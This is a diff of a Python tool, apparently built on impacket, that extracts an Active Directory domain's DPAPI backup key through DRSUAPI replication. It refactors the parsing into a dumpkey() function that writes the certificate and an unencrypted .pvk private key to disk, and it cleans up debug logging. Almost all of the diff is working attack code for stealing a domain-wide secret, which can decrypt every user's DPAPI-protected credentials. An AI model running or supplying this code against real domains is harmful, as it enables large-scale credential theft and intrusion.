@@ -467,6 +467,43 @@ class DrsKeyObject:
             logging.error(str(e))
         
         return decrypted_bytes
+
+def dumpkey(decrypted_bytes):
+    try:
+        keyVersion = struct.unpack('<L', decrypted_bytes[:4])[0]
+        if keyVersion == 1:  # legacy key
+            backup_key = P_BACKUP_KEY(decrypted_bytes)
+            backupkey = backup_key['Data']
+            
+            logging.info("Exporting legacy key to file {}".format(domain + ".key"))
+            open(domain + ".key", 'wb').write(backupkey)
+            
+
+        elif keyVersion == 2:  # preferred key
+            backup_key = PREFERRED_BACKUP_KEY(decrypted_bytes)
+            pvk = backup_key['Data'][:backup_key['KeyLength']]
+            cert = backup_key['Data'][backup_key['KeyLength']:backup_key['KeyLength'] + backup_key['CertificateLength']]
+
+            # build pvk header (PVK_MAGIC, PVK_FILE_VERSION_0, KeySpec, PVK_NO_ENCRYPT, 0, cbPvk)
+            header = PVK_FILE_HDR()
+            header['dwMagic'] = 0xb0b5f11e
+            header['dwVersion'] = 0
+            header['dwKeySpec'] = 1
+            header['dwEncryptType'] = 0
+            header['cbEncryptData'] = 0
+            header['cbPvk'] = backup_key['KeyLength']
+            backupkey_pvk = header.getData() + pvk  # pvk blob
+
+            backupkey = backupkey_pvk
+            
+            logging.info("Exporting certificate to file {}".format(domain + ".der"))
+            open(domain + ".der", 'wb').write(cert)
+            logging.info("Exporting private key to file {}".format(domain + ".pvk"))
+            open(domain + ".pvk", 'wb').write(backupkey)
+    except Exception as e:
+                if logging.getLogger().level == logging.DEBUG:
+                    import traceback
+                    traceback.print_exc()
     
 
 class DumpBackupKey:
@@ -643,8 +680,9 @@ if __name__ == '__main__':
 
         try:
             decrypted_bytes = dumper.dump()
-            decrypted_guid = bin_to_string(decrypted_bytes)
-            logging.debug(f'in for 0.1 ###############  currentValue: {decrypted_guid}')
+            logging.debug(f'dumped currentValue via DRSUAPI \n {decrypted_bytes}')
+            dumpkey(decrypted_bytes)
+            sys.exit(0)
 
         except Exception as e:
             if logging.getLogger().level == logging.DEBUG:
@@ -663,7 +701,7 @@ if __name__ == '__main__':
                 try:
                     decrypted_bytes = dumper.dump()
                     decrypted_guid = bin_to_string(decrypted_bytes)
-                    logging.debug(f'in for 1 ###############  currentValue: {decrypted_guid}')
+                    logging.debug(f'currentValue: {decrypted_guid}')
                     break
 
                 except Exception as e:
@@ -682,39 +720,8 @@ if __name__ == '__main__':
 
                 decrypted_bytes = dumper.dump()
                 logging.debug(f'dumped currentValue via DRSUAPI \n {decrypted_bytes}')
-
-                keyVersion = struct.unpack('<L', decrypted_bytes[:4])[0]
-                if keyVersion == 1:  # legacy key
-                    backup_key = P_BACKUP_KEY(decrypted_bytes)
-                    backupkey = backup_key['Data']
-                    
-                    logging.info("Exporting legacy key to file {}".format(domain + ".key"))
-                    open(domain + ".key", 'wb').write(backupkey)
-                    
-
-                elif keyVersion == 2:  # preferred key
-                    backup_key = PREFERRED_BACKUP_KEY(decrypted_bytes)
-                    pvk = backup_key['Data'][:backup_key['KeyLength']]
-                    cert = backup_key['Data'][backup_key['KeyLength']:backup_key['KeyLength'] + backup_key['CertificateLength']]
-
-                    # build pvk header (PVK_MAGIC, PVK_FILE_VERSION_0, KeySpec, PVK_NO_ENCRYPT, 0, cbPvk)
-                    header = PVK_FILE_HDR()
-                    header['dwMagic'] = 0xb0b5f11e
-                    header['dwVersion'] = 0
-                    header['dwKeySpec'] = 1
-                    header['dwEncryptType'] = 0
-                    header['cbEncryptData'] = 0
-                    header['cbPvk'] = backup_key['KeyLength']
-                    backupkey_pvk = header.getData() + pvk  # pvk blob
-
-                    backupkey = backupkey_pvk
-                    
-                    logging.info("Exporting certificate to file {}".format(domain + ".der"))
-                    open(domain + ".der", 'wb').write(cert)
-                    logging.info("Exporting private key to file {}".format(domain + ".pvk"))
-                    open(domain + ".pvk", 'wb').write(backupkey)
-                    
-
+                dumpkey(decrypted_bytes)
+                
         except Exception as e:
                 if logging.getLogger().level == logging.DEBUG:
                     import traceback
